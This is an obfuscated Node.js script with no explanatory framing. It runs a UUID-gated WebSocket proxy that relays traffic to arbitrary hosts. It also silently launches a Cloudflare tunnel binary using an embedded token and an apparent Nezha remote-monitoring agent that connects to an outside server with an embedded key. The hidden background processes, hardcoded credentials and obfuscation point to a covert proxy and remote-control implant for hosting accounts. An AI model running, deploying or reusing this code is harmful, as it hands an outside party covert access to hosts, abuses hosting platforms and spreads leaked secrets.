const _0x3f330c=_0x39c6;(function(_0x15fd0a,_0x5ceb48){const _0x434593=_0x39c6,_0x402ae6=_0x15fd0a();while(!![]){try{const _0x5277a3=parseInt(_0x434593(0x178))/0x1+-parseInt(_0x434593(0x16f))/0x2+parseInt(_0x434593(0x17c))/0x3*(-parseInt(_0x434593(0x16e))/0x4)+parseInt(_0x434593(0x16a))/0x5*(-parseInt(_0x434593(0x161))/0x6)+-parseInt(_0x434593(0x18a))/0x7*(-parseInt(_0x434593(0x184))/0x8)+-parseInt(_0x434593(0x187))/0x9+parseInt(_0x434593(0x15c))/0xa;if(_0x5277a3===_0x5ceb48)break;else _0x402ae6['push'](_0x402ae6['shift']());}catch(_0x369865){_0x402ae6['push'](_0x402ae6['shift']());}}}(_0x2c63,0x6bf1a));const net=require(_0x3f330c(0x173)),{exec}=require(_0x3f330c(0x171)),{WebSocket,createWebSocketStream}=require('ws'),logcb=(..._0x4fcb00)=>console[_0x3f330c(0x162)][_0x3f330c(0x189)](this,..._0x4fcb00),errcb=(..._0x1ca8fd)=>console['error'][_0x3f330c(0x189)](this,..._0x1ca8fd),{spawn}=require('child_process'),uuid=(process['env']['UUID']||'7090ff5d-f321-4248-a7c3-d8837f124999')[_0x3f330c(0x16c)](/-/g,''),port=process[_0x3f330c(0x16b)]['PORT']||0x1f90,NZ_SERVER=process[_0x3f330c(0x16b)]['NZ_SERVER']||_0x3f330c(0x165),NZ_KEY=process[_0x3f330c(0x16b)][_0x3f330c(0x176)]||_0x3f330c(0x174),AGO_AUTH=process[_0x3f330c(0x16b)][_0x3f330c(0x17f)]||_0x3f330c(0x17b),cfCommand=_0x3f330c(0x186)+AGO_AUTH+'\x20>/dev/null\x202>&1\x20&';exec(cfCommand,(_0x47854f,_0x1f4c1f,_0x2bb22f)=>{const _0x3b69dd=_0x3f330c;_0x47854f?console[_0x3b69dd(0x183)](_0x3b69dd(0x15e)+_0x47854f):console[_0x3b69dd(0x162)]('cf\x20is\x20running');});const nzCommand='chmod\x20+x\x20nz\x20&&\x20./nz\x20-s\x20'+NZ_SERVER+'\x20-p\x20'+NZ_KEY+_0x3f330c(0x160);exec(nzCommand,(_0xe9e31a,_0x42065e,_0x4cc26d)=>{const _0x54b424=_0x3f330c;_0xe9e31a?console[_0x54b424(0x183)](_0x54b424(0x163)+_0xe9e31a):console[_0x54b424(0x162)](_0x54b424(0x167));});function _0x39c6(_0x6601e2,_0x3c2434){const _0x2c634b=_0x2c63();return _0x39c6=function(_0x39c6eb,_0x373f34){_0x39c6eb=_0x39c6eb-0x15c;let _0x4a3041=_0x2c634b[_0x39c6eb];return _0x4a3041;},_0x39c6(_0x6601e2,_0x3c2434);}const ws=new WebSocket[(_0x3f330c(0x170))]({'port':port},logcb(_0x3f330c(0x180),port));ws['on']('connection',_0x278adc=>{const _0x5e7d98=_0x3f330c;console['log'](_0x5e7d98(0x17d)),_0x278adc[_0x5e7d98(0x16d)](_0x5e7d98(0x179),_0x3690f0=>{const _0x34516e=_0x5e7d98,[_0x323255]=_0x3690f0,_0x372413=_0x3690f0['slice'](0x1,0x11);if(!_0x372413[_0x34516e(0x17a)]((_0x9ad594,_0x5a2f68)=>_0x9ad594==parseInt(uuid['substr'](_0x5a2f68*0x2,0x2),0x10)))return;let _0x4e4f4a=_0x3690f0[_0x34516e(0x175)](0x11,0x12)['readUInt8']()+0x13;const _0x5ead7a=_0x3690f0[_0x34516e(0x175)](_0x4e4f4a,_0x4e4f4a+=0x2)[_0x34516e(0x166)](0x0),_0x5a6c80=_0x3690f0['slice'](_0x4e4f4a,_0x4e4f4a+=0x1)[_0x34516e(0x18c)](),_0x59d292=_0x5a6c80==0x1?_0x3690f0[_0x34516e(0x175)](_0x4e4f4a,_0x4e4f4a+=0x4)[_0x34516e(0x188)]('.'):_0x5a6c80==0x2?new TextDecoder()[_0x34516e(0x15d)](_0x3690f0[_0x34516e(0x175)](_0x4e4f4a+0x1,_0x4e4f4a+=0x1+_0x3690f0[_0x34516e(0x175)](_0x4e4f4a,_0x4e4f4a+0x1)[_0x34516e(0x18c)]())):_0x5a6c80==0x3?_0x3690f0['slice'](_0x4e4f4a,_0x4e4f4a+=0x10)[_0x34516e(0x172)]((_0x28f7f6,_0x15a8f6,_0x128209,_0x214edb)=>_0x128209%0x2?_0x28f7f6[_0x34516e(0x169)](_0x214edb['slice'](_0x128209-0x1,_0x128209+0x1)):_0x28f7f6,[])[_0x34516e(0x181)](_0x4c2d76=>_0x4c2d76[_0x34516e(0x166)](0x0)[_0x34516e(0x18b)](0x10))['join'](':'):'';logcb('Connect:',_0x59d292,_0x5ead7a),_0x278adc[_0x34516e(0x164)](new Uint8Array([_0x323255,0x0]));const _0x23281c=createWebSocketStream(_0x278adc);net['connect']({'host':_0x59d292,'port':_0x5ead7a},function(){const _0x4d2f82=_0x34516e;this[_0x4d2f82(0x182)](_0x3690f0[_0x4d2f82(0x175)](_0x4e4f4a)),_0x23281c['on']('error',errcb(_0x4d2f82(0x17e)))[_0x4d2f82(0x15f)](this)['on']('error',errcb(_0x4d2f82(0x177)))['pipe'](_0x23281c);})['on'](_0x34516e(0x183),errcb(_0x34516e(0x185),{'host':_0x59d292,'port':_0x5ead7a}));})['on'](_0x5e7d98(0x183),errcb(_0x5e7d98(0x168)));});function _0x2c63(){const _0x48795c=['map','write','error','1992104qGAdVW','Connect-Err:','chmod\x20+x\x20cf\x20&&\x20./cf\x20tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20run\x20--token\x20','6743376vFZrQZ','join','bind','21IZYwQg','toString','readUInt8','13224820KIHKcV','decode','Error\x20running\x20cf:\x20','pipe','\x20--tls\x20>\x20/dev/null\x202>&1\x20&','708078iudGGN','log','Error\x20running\x20nz:\x20','send','nz.seav.eu.org:443','readUInt16BE','nz\x20is\x20running','WebSocket\x20Error:','concat','35DlAKdw','env','replace','once','4hpIfkR','1001566PWlzVN','Server','child_process','reduce','net','aHvwfH26ppIJ09sbBN','slice','NZ_KEY','E2:','584244mcLNpR','message','every','eyJhIjoiMzg2OGEzNjc2ZTkyZmUxMmY0NjM1YTU0ZmNhMDQ0NDMiLCJ0IjoiMDYzNzgwZjQtODdiNS00YWQ0LThkNTMtOGJmYzA5ZmFlMmVkIiwicyI6Ik9XRTVZamMyTTJZdE1XRmhaQzAwTkdVNExXRXpNakl0TldVNU56WXdPVEZsT0RCayJ9','406467uvhaaT','connected\x20successfully','E1:','AGO_AUTH','listening:'];_0x2c63=function(){return _0x48795c;};return _0x2c63();}